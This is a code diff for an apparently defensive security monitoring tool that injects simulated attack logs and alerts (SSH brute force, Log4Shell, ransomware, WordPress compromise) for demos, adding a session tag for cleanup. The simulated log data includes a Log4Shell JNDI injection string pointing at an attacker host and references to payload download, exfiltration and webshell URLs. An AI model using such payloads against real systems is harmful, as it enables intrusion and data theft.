@@ -30,6 +30,7 @@ pub struct ScenarioResult {
     pub intelligence_score: Option<f64>,
     pub notification_level: Option<String>,
     pub message: String,
+    pub demo_session: Option<String>,
 }
 
 /// List all available test scenarios.
@@ -111,11 +112,15 @@ pub fn list_scenarios() -> Vec<ScenarioInfo> {
 }
 
 /// Run a test scenario — injects data and optionally triggers intelligence cycle.
+/// All injected data is tagged with demo=true + a unique session ID for cleanup.
 pub async fn run_scenario(
     store: Arc<dyn Database>,
     scenario_id: &str,
     trigger_intelligence: bool,
 ) -> ScenarioResult {
+    // Generate a unique demo session ID for this run
+    let demo_session = uuid::Uuid::new_v4().to_string();
+
     let mut result = ScenarioResult {
         scenario_id: scenario_id.into(),
         logs_injected: 0,
@@ -124,18 +129,19 @@ pub async fn run_scenario(
         intelligence_score: None,
         notification_level: None,
         message: String::new(),
+        demo_session: Some(demo_session.clone()),
     };
 
     match scenario_id {
-        "ssh-brute-force" => run_ssh_brute_force(&store, &mut result).await,
-        "log4shell-exploit" => run_log4shell(&store, &mut result).await,
-        "phishing-campaign" => run_phishing(&store, &mut result).await,
-        "lateral-movement" => run_lateral_movement(&store, &mut result).await,
-        "c2-communication" => run_c2_communication(&store, &mut result).await,
-        "full-intrusion" => run_full_intrusion(&store, &mut result).await,
-        "apt-multi-target" => run_apt_multi_target(&store, &mut result).await,
-        "ransomware-spread" => run_ransomware_spread(&store, &mut result).await,
-        "web-compromise" => run_web_compromise(&store, &mut result).await,
+        "ssh-brute-force" => run_ssh_brute_force(&store, &mut result, &demo_session).await,
+        "log4shell-exploit" => run_log4shell(&store, &mut result, &demo_session).await,
+        "phishing-campaign" => run_phishing(&store, &mut result, &demo_session).await,
+        "lateral-movement" => run_lateral_movement(&store, &mut result, &demo_session).await,
+        "c2-communication" => run_c2_communication(&store, &mut result, &demo_session).await,
+        "full-intrusion" => run_full_intrusion(&store, &mut result, &demo_session).await,
+        "apt-multi-target" => run_apt_multi_target(&store, &mut result, &demo_session).await,
+        "ransomware-spread" => run_ransomware_spread(&store, &mut result, &demo_session).await,
+        "web-compromise" => run_web_compromise(&store, &mut result, &demo_session).await,
         _ => {
             result.message = format!("Scénario inconnu : {}", scenario_id);
             return result;
@@ -190,6 +196,8 @@ pub async fn run_scenario(
             asset: None,
             source: Some(format!("threatclaw-l{}", react_result.escalation_level)),
             metadata: Some(json!({
+                "demo": true,
+                "demo_session": demo_session,
                 "escalation_level": react_result.escalation_level,
                 "confidence": confidence,
                 "correlations": correlations,
@@ -301,7 +309,7 @@ pub async fn run_scenario(
 // SCENARIO: SSH Brute Force
 // ═══════════════════════════════════════════════════════════
 
-async fn run_ssh_brute_force(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
+async fn run_ssh_brute_force(store: &Arc<dyn Database>, result: &mut ScenarioResult, demo_session: &str) {
     let attacker_ip = "185.220.101.42"; // Real Tor exit node, malicious in GreyNoise
     let target = "192.168.1.107";
     let now = chrono::Utc::now();
@@ -321,7 +329,7 @@ async fn run_ssh_brute_force(store: &Arc<dyn Database>, result: &mut ScenarioRes
             "severity": "warning",
             "source_ip": attacker_ip,
             "timestamp": ts.to_rfc3339(),
-        }), &ts).await;
+        }), &ts, demo_session).await;
         result.logs_injected += 1;
     }
 
@@ -336,7 +344,7 @@ async fn run_ssh_brute_force(store: &Arc<dyn Database>, result: &mut ScenarioRes
             "severity": "info",
             "source_ip": attacker_ip,
             "timestamp": ts.to_rfc3339(),
-        }), &ts).await;
+        }), &ts, demo_session).await;
         result.logs_injected += 1;
     }
 
@@ -353,6 +361,7 @@ async fn run_ssh_brute_force(store: &Arc<dyn Database>, result: &mut ScenarioRes
         target,
         Some(attacker_ip),
         Some("backup"),
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -369,7 +378,7 @@ async fn run_ssh_brute_force(store: &Arc<dyn Database>, result: &mut ScenarioRes
 // SCENARIO: Log4Shell Exploitation
 // ═══════════════════════════════════════════════════════════
 
-async fn run_log4shell(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
+async fn run_log4shell(store: &Arc<dyn Database>, result: &mut ScenarioResult, demo_session: &str) {
     let attacker_ip = "45.155.205.233"; // Known scanner
     let target = "192.168.1.107";
     let now = chrono::Utc::now();
@@ -397,6 +406,7 @@ async fn run_log4shell(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
                 "timestamp": ts.to_rfc3339(),
             }),
             &ts,
+            demo_session,
         )
         .await;
         result.logs_injected += 1;
@@ -414,6 +424,7 @@ async fn run_log4shell(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
         target,
         Some(attacker_ip),
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -429,7 +440,7 @@ async fn run_log4shell(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
 // SCENARIO: Phishing Campaign
 // ═══════════════════════════════════════════════════════════
 
-async fn run_phishing(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
+async fn run_phishing(store: &Arc<dyn Database>, result: &mut ScenarioResult, demo_session: &str) {
     let target = "192.168.1.50";
     let now = chrono::Utc::now();
 
@@ -456,6 +467,7 @@ async fn run_phishing(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
                 "timestamp": ts.to_rfc3339(),
             }),
             &ts,
+            demo_session,
         )
         .await;
         result.logs_injected += 1;
@@ -469,7 +481,7 @@ async fn run_phishing(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
         "to": "j.dupont@example.fr",
         "status": "delivered",
         "timestamp": (now - chrono::Duration::minutes(15)).to_rfc3339(),
-    }), &(now - chrono::Duration::minutes(15))).await;
+    }), &(now - chrono::Duration::minutes(15)), demo_session).await;
     result.logs_injected += 1;
 
     inject_sigma_alert(
@@ -480,6 +492,7 @@ async fn run_phishing(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
         target,
         None,
         Some("jdupont"),
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -495,7 +508,7 @@ async fn run_phishing(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
 // SCENARIO: Lateral Movement
 // ═══════════════════════════════════════════════════════════
 
-async fn run_lateral_movement(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
+async fn run_lateral_movement(store: &Arc<dyn Database>, result: &mut ScenarioResult, demo_session: &str) {
     let compromised = "192.168.1.50";
     let target = "192.168.1.107";
     let now = chrono::Utc::now();
@@ -506,7 +519,7 @@ async fn run_lateral_movement(store: &Arc<dyn Database>, result: &mut ScenarioRe
         "ident": "sshd", "facility": "auth", "severity": "info",
         "source_ip": compromised,
         "timestamp": (now - chrono::Duration::minutes(5)).to_rfc3339(),
-    }), &(now - chrono::Duration::minutes(5))).await;
+    }), &(now - chrono::Duration::minutes(5)), demo_session).await;
     result.logs_injected += 1;
 
     // Privilege escalation via sudo
@@ -520,6 +533,7 @@ async fn run_lateral_movement(store: &Arc<dyn Database>, result: &mut ScenarioRe
             "timestamp": (now - chrono::Duration::minutes(4)).to_rfc3339(),
         }),
         &(now - chrono::Duration::minutes(4)),
+        demo_session,
     )
     .await;
     result.logs_injected += 1;
@@ -531,7 +545,7 @@ async fn run_lateral_movement(store: &Arc<dyn Database>, result: &mut ScenarioRe
         "url": "http://185.220.101.42:8443/payload.sh",
         "source_ip": "185.220.101.42",
         "timestamp": (now - chrono::Duration::minutes(3)).to_rfc3339(),
-    }), &(now - chrono::Duration::minutes(3))).await;
+    }), &(now - chrono::Duration::minutes(3)), demo_session).await;
     result.logs_injected += 1;
 
     // Sigma alerts
@@ -546,6 +560,7 @@ async fn run_lateral_movement(store: &Arc<dyn Database>, result: &mut ScenarioRe
         target,
         Some(compromised),
         Some("www-data"),
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -558,6 +573,7 @@ async fn run_lateral_movement(store: &Arc<dyn Database>, result: &mut ScenarioRe
         target,
         None,
         Some("www-data"),
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -573,7 +589,7 @@ async fn run_lateral_movement(store: &Arc<dyn Database>, result: &mut ScenarioRe
 // SCENARIO: C2 Communication
 // ═══════════════════════════════════════════════════════════
 
-async fn run_c2_communication(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
+async fn run_c2_communication(store: &Arc<dyn Database>, result: &mut ScenarioResult, demo_session: &str) {
     let target = "192.168.1.50";
     let c2_domain = "update-service-cdn.xyz";
     let c2_ip = "91.215.85.209";
@@ -596,6 +612,7 @@ async fn run_c2_communication(store: &Arc<dyn Database>, result: &mut ScenarioRe
                 "timestamp": ts.to_rfc3339(),
             }),
             &ts,
+            demo_session,
         )
         .await;
         result.logs_injected += 1;
@@ -612,7 +629,7 @@ async fn run_c2_communication(store: &Arc<dyn Database>, result: &mut ScenarioRe
             "bytes_received": 128 + i * 50,
             "source_ip": target,
             "timestamp": ts.to_rfc3339(),
-        }), &ts).await;
+        }), &ts, demo_session).await;
         result.logs_injected += 1;
     }
 
@@ -627,6 +644,7 @@ async fn run_c2_communication(store: &Arc<dyn Database>, result: &mut ScenarioRe
         target,
         Some(c2_ip),
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -642,7 +660,7 @@ async fn run_c2_communication(store: &Arc<dyn Database>, result: &mut ScenarioRe
 // SCENARIO: Full Intrusion (kill chain complète)
 // ═══════════════════════════════════════════════════════════
 
-async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
+async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResult, demo_session: &str) {
     // Phase 1: Reconnaissance (scan de ports)
     let attacker = "185.220.101.42";
     let target = "192.168.1.107";
@@ -653,7 +671,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
         "action": "block", "source_ip": attacker, "dest_ip": target,
         "ports_scanned": [22, 80, 443, 3389, 5432, 8080, 9200],
         "timestamp": (now - chrono::Duration::minutes(30)).to_rfc3339(),
-    }), &(now - chrono::Duration::minutes(30))).await;
+    }), &(now - chrono::Duration::minutes(30)), demo_session).await;
     result.logs_injected += 1;
 
     // Phase 2: Exploitation (Log4Shell sur port 8080)
@@ -661,7 +679,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
         "message": format!("POST /api/login HTTP/1.1 - X-Forwarded-For: ${{jndi:ldap://{}:1389/a}}", attacker),
         "source_ip": attacker, "dest_port": 8080,
         "timestamp": (now - chrono::Duration::minutes(20)).to_rfc3339(),
-    }), &(now - chrono::Duration::minutes(20))).await;
+    }), &(now - chrono::Duration::minutes(20)), demo_session).await;
     result.logs_injected += 1;
 
     // Phase 3: Reverse shell established
@@ -675,6 +693,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
             "timestamp": (now - chrono::Duration::minutes(18)).to_rfc3339(),
         }),
         &(now - chrono::Duration::minutes(18)),
+        demo_session,
     )
     .await;
     result.logs_injected += 1;
@@ -685,7 +704,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
         "ident": "bash", "url": "http://185.220.101.42:8443/exfil",
         "source_ip": "185.220.101.42",
         "timestamp": (now - chrono::Duration::minutes(15)).to_rfc3339(),
-    }), &(now - chrono::Duration::minutes(15))).await;
+    }), &(now - chrono::Duration::minutes(15)), demo_session).await;
     result.logs_injected += 1;
 
     // Phase 5: Lateral movement to other servers
@@ -699,6 +718,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
             "timestamp": (now - chrono::Duration::minutes(10)).to_rfc3339(),
         }),
         &(now - chrono::Duration::minutes(10)),
+        demo_session,
     )
     .await;
     result.logs_injected += 1;
@@ -717,6 +737,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
                 "timestamp": ts.to_rfc3339(),
             }),
             &ts,
+            demo_session,
         )
         .await;
         result.logs_injected += 1;
@@ -731,6 +752,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
         target,
         Some(attacker),
         None,
+        demo_session,
     )
     .await;
     inject_sigma_alert(
@@ -741,6 +763,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
         target,
         Some(attacker),
         None,
+        demo_session,
     )
     .await;
     inject_sigma_alert(
@@ -751,6 +774,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
         target,
         Some(attacker),
         None,
+        demo_session,
     )
     .await;
     inject_sigma_alert(
@@ -761,6 +785,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
         target,
         Some(attacker),
         None,
+        demo_session,
     )
     .await;
     inject_sigma_alert(
@@ -774,6 +799,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
         "192.168.1.108",
         Some(target),
         Some("root"),
+        demo_session,
     )
     .await;
     inject_sigma_alert(
@@ -784,6 +810,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
         target,
         None,
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 6;
@@ -801,7 +828,7 @@ async fn run_full_intrusion(store: &Arc<dyn Database>, result: &mut ScenarioResu
 // 3 attaquants → 5 serveurs → CVEs réels → pivot → exfiltration
 // ═══════════════════════════════════════════════════════════
 
-async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
+async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioResult, demo_session: &str) {
     let now = chrono::Utc::now();
 
     // Attaquants (IPs réelles malveillantes dans les feeds publics)
@@ -825,7 +852,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
             "ident": "pf", "facility": "kern", "severity": "warning",
             "source_ip": attackers[0], "dest_port": port,
             "timestamp": ts.to_rfc3339(),
-        }), &ts).await;
+        }), &ts, demo_session).await;
         result.logs_injected += 1;
     }
     inject_sigma_alert(
@@ -839,6 +866,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         web_server,
         Some(attackers[0]),
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -867,6 +895,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
                 "timestamp": ts.to_rfc3339(),
             }),
             &ts,
+            demo_session,
         )
         .await;
         result.logs_injected += 1;
@@ -882,6 +911,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         web_server,
         Some(attackers[1]),
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -893,7 +923,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         "ident": "kernel", "facility": "kern", "severity": "crit",
         "source_ip": attackers[1],
         "timestamp": ts.to_rfc3339(),
-    }), &ts).await;
+    }), &ts, demo_session).await;
     result.logs_injected += 1;
 
     inject_sigma_alert(
@@ -907,6 +937,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         web_server,
         Some(attackers[1]),
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -935,6 +966,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
                 "timestamp": ts.to_rfc3339(),
             }),
             &ts,
+            demo_session,
         )
         .await;
         result.logs_injected += 1;
@@ -947,6 +979,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         web_server,
         None,
         Some("www-data"),
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -959,7 +992,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         "ident": "sshd", "pid": 5001, "facility": "auth", "severity": "info",
         "source_ip": web_server, "username": "deploy",
         "timestamp": ts.to_rfc3339(),
-    }), &ts).await;
+    }), &ts, demo_session).await;
     result.logs_injected += 1;
 
     // Sudo escalation
@@ -975,6 +1008,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
             "timestamp": ts.to_rfc3339(),
         }),
         &ts,
+        demo_session,
     )
     .await;
     result.logs_injected += 1;
@@ -990,6 +1024,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         app_server,
         Some(web_server),
         Some("deploy"),
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1001,7 +1036,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         "ident": "sshd", "facility": "daemon", "severity": "crit",
         "source_ip": web_server,
         "timestamp": phase5_start.to_rfc3339(),
-    }), &phase5_start).await;
+    }), &phase5_start, demo_session).await;
     result.logs_injected += 1;
 
     inject_sigma_alert(
@@ -1015,6 +1050,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         app_server,
         Some(web_server),
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1026,7 +1062,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         "ident": "sshd", "pid": 6001, "facility": "auth", "severity": "info",
         "source_ip": app_server, "username": "postgres",
         "timestamp": phase6_start.to_rfc3339(),
-    }), &phase6_start).await;
+    }), &phase6_start, demo_session).await;
     result.logs_injected += 1;
 
     // DB dump
@@ -1050,6 +1086,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
                 "timestamp": ts.to_rfc3339(),
             }),
             &ts,
+            demo_session,
         )
         .await;
         result.logs_injected += 1;
@@ -1066,6 +1103,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         db_server,
         Some(app_server),
         Some("postgres"),
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1077,7 +1115,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         "ident": "smbd", "facility": "daemon", "severity": "warning",
         "source_ip": attackers[2], "username": "CORP\\admin$",
         "timestamp": phase7_start.to_rfc3339(),
-    }), &phase7_start).await;
+    }), &phase7_start, demo_session).await;
     result.logs_injected += 1;
 
     inject_log(store, "syslog.udp.auth", dc_server, &json!({
@@ -1085,7 +1123,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         "ident": "krb5kdc", "facility": "auth", "severity": "crit",
         "source_ip": attackers[2], "username": "CORP\\Administrator",
         "timestamp": (phase7_start + chrono::Duration::seconds(15)).to_rfc3339(),
-    }), &(phase7_start + chrono::Duration::seconds(15))).await;
+    }), &(phase7_start + chrono::Duration::seconds(15)), demo_session).await;
     result.logs_injected += 1;
 
     inject_sigma_alert(
@@ -1099,6 +1137,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         dc_server,
         Some(attackers[2]),
         Some("CORP\\Administrator"),
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1120,6 +1159,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
                 "timestamp": ts.to_rfc3339(),
             }),
             &ts,
+            demo_session,
         )
         .await;
         result.logs_injected += 1;
@@ -1136,6 +1176,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
         db_server,
         None,
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1150,7 +1191,7 @@ async fn run_apt_multi_target(store: &Arc<dyn Database>, result: &mut ScenarioRe
 // SCENARIO: Propagation ransomware réseau
 // ═══════════════════════════════════════════════════════════
 
-async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
+async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioResult, demo_session: &str) {
     let now = chrono::Utc::now();
     let attacker = "194.26.192.77";
     let patient_zero = "192.168.1.50";
@@ -1168,7 +1209,7 @@ async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioR
         "ident": "squid", "facility": "daemon", "severity": "info",
         "source_ip": patient_zero, "url": "http://malware-host.xyz/invoice_2024.xlsm",
         "timestamp": ts.to_rfc3339(),
-    }), &ts).await;
+    }), &ts, demo_session).await;
     result.logs_injected += 1;
 
     let ts = now - chrono::Duration::minutes(19);
@@ -1177,7 +1218,7 @@ async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioR
         "ident": "auditd", "facility": "auth", "severity": "crit",
         "username": "user1",
         "timestamp": ts.to_rfc3339(),
-    }), &ts).await;
+    }), &ts, demo_session).await;
     result.logs_injected += 1;
 
     inject_sigma_alert(
@@ -1191,6 +1232,7 @@ async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioR
         patient_zero,
         None,
         Some("user1"),
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1211,6 +1253,7 @@ async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioR
                 "timestamp": ts.to_rfc3339(),
             }),
             &ts,
+            demo_session,
         )
         .await;
         result.logs_injected += 1;
@@ -1227,6 +1270,7 @@ async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioR
         patient_zero,
         None,
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1240,7 +1284,7 @@ async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioR
             "ident": "smbd", "facility": "daemon", "severity": "crit",
             "source_ip": patient_zero, "username": "SYSTEM",
             "timestamp": ts.to_rfc3339(),
-        }), &ts).await;
+        }), &ts, demo_session).await;
         result.logs_injected += 1;
 
         // Service installation (ransomware binary)
@@ -1250,7 +1294,7 @@ async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioR
             "ident": "eventlog", "facility": "daemon", "severity": "crit",
             "username": "SYSTEM",
             "timestamp": ts2.to_rfc3339(),
-        }), &ts2).await;
+        }), &ts2, demo_session).await;
         result.logs_injected += 1;
 
         inject_sigma_alert(
@@ -1264,6 +1308,7 @@ async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioR
             victim,
             Some(patient_zero),
             Some("SYSTEM"),
+            demo_session,
         )
         .await;
         result.alerts_created += 1;
@@ -1277,7 +1322,7 @@ async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioR
             "message": format!("File system activity: 1247 files renamed to *.locked in /srv/data/ — ransomware encryption in progress"),
             "ident": "auditd", "facility": "kern", "severity": "emerg",
             "timestamp": ts.to_rfc3339(),
-        }), &ts).await;
+        }), &ts, demo_session).await;
         result.logs_injected += 1;
     }
 
@@ -1293,6 +1338,7 @@ async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioR
         patient_zero,
         None,
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1302,7 +1348,7 @@ async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioR
         "message": "File created: C:\\README_RESTORE_FILES.txt — 'Your files have been encrypted. Send 5 BTC to bc1q...'",
         "ident": "auditd", "facility": "kern", "severity": "emerg",
         "timestamp": now.to_rfc3339(),
-    }), &now).await;
+    }), &now, demo_session).await;
     result.logs_injected += 1;
 
     result.message = format!(
@@ -1317,7 +1363,7 @@ async fn run_ransomware_spread(store: &Arc<dyn Database>, result: &mut ScenarioR
 // SCENARIO: Compromission WordPress
 // ═══════════════════════════════════════════════════════════
 
-async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResult) {
+async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResult, demo_session: &str) {
     let now = chrono::Utc::now();
     let attacker = "45.155.205.233";
     let web_server = "192.168.1.80";
@@ -1345,7 +1391,7 @@ async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResu
             "source_ip": attacker, "http_method": "GET",
             "url": format!("/wp-content/plugins/{}/readme.txt", plugin),
             "timestamp": ts.to_rfc3339(),
-        }), &ts).await;
+        }), &ts, demo_session).await;
         result.logs_injected += 1;
     }
 
@@ -1360,6 +1406,7 @@ async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResu
         web_server,
         Some(attacker),
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1373,7 +1420,7 @@ async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResu
         "source_ip": attacker, "http_method": "POST",
         "url": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
         "timestamp": phase2_start.to_rfc3339(),
-    }), &phase2_start).await;
+    }), &phase2_start, demo_session).await;
     result.logs_injected += 1;
 
     inject_sigma_alert(
@@ -1387,6 +1434,7 @@ async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResu
         web_server,
         Some(attacker),
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1400,7 +1448,7 @@ async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResu
         "source_ip": attacker, "http_method": "POST",
         "url": "/wp-content/uploads/2024/shell.php",
         "timestamp": ts.to_rfc3339(),
-    }), &ts).await;
+    }), &ts, demo_session).await;
     result.logs_injected += 1;
 
     inject_sigma_alert(
@@ -1411,6 +1459,7 @@ async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResu
         web_server,
         Some(attacker),
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1422,7 +1471,7 @@ async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResu
         "ident": "auditd", "facility": "auth", "severity": "crit",
         "username": "www-data",
         "timestamp": phase3_start.to_rfc3339(),
-    }), &phase3_start).await;
+    }), &phase3_start, demo_session).await;
     result.logs_injected += 1;
 
     // ── Phase 4: DB credential theft + data exfil ──
@@ -1447,6 +1496,7 @@ async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResu
                 "timestamp": ts.to_rfc3339(),
             }),
             &ts,
+            demo_session,
         )
         .await;
         result.logs_injected += 1;
@@ -1460,6 +1510,7 @@ async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResu
         web_server,
         Some(attacker),
         Some("www-data"),
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1472,7 +1523,7 @@ async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResu
         "ident": "apache2", "facility": "daemon", "severity": "crit",
         "source_ip": attacker,
         "timestamp": phase5_start.to_rfc3339(),
-    }), &phase5_start).await;
+    }), &phase5_start, demo_session).await;
     result.logs_injected += 1;
 
     inject_sigma_alert(
@@ -1483,6 +1534,7 @@ async fn run_web_compromise(store: &Arc<dyn Database>, result: &mut ScenarioResu
         web_server,
         Some(attacker),
         None,
+        demo_session,
     )
     .await;
     result.alerts_created += 1;
@@ -1504,12 +1556,18 @@ async fn inject_log(
     hostname: &str,
     data: &serde_json::Value,
     time: &chrono::DateTime<chrono::Utc>,
+    demo_session: &str,
 ) {
     use crate::db::threatclaw_store::ThreatClawStore;
+    let mut data = data.clone();
+    if let Some(obj) = data.as_object_mut() {
+        obj.insert("demo".to_string(), json!(true));
+        obj.insert("demo_session".to_string(), json!(demo_session));
+    }
     let time_str = time.to_rfc3339();
-    match store.insert_log(tag, hostname, data, &time_str).await {
-        Ok(id) => tracing::debug!("TEST: Injected log id={} tag={} host={}", id, tag, hostname),
-        Err(e) => tracing::warn!("TEST: Failed to inject log: {e}"),
+    match store.insert_log(tag, hostname, &data, &time_str).await {
+        Ok(id) => tracing::debug!("DEMO: Injected log id={} tag={} host={} session={}", id, tag, hostname, demo_session),
+        Err(e) => tracing::warn!("DEMO: Failed to inject log: {e}"),
     }
 }
 
@@ -1522,14 +1580,17 @@ async fn inject_sigma_alert(
     hostname: &str,
     source_ip: Option<&str>,
     username: Option<&str>,
+    demo_session: &str,
 ) {
     use crate::db::threatclaw_store::ThreatClawStore;
+    let demo_title = format!("[DEMO] {}", title);
+    let demo_rule_id = format!("demo-{}-{}", rule_id, &demo_session[..8]);
     match store
-        .insert_sigma_alert(rule_id, level, title, hostname, source_ip, username)
+        .insert_sigma_alert(&demo_rule_id, level, &demo_title, hostname, source_ip, username)
         .await
     {
-        Ok(id) => tracing::debug!("TEST: Injected sigma alert id={} rule={}", id, rule_id),
-        Err(e) => tracing::warn!("TEST: Failed to inject alert: {e}"),
+        Ok(id) => tracing::debug!("DEMO: Injected sigma alert id={} rule={} session={}", id, demo_rule_id, demo_session),
+        Err(e) => tracing::warn!("DEMO: Failed to inject alert: {e}"),
     }
 }
 
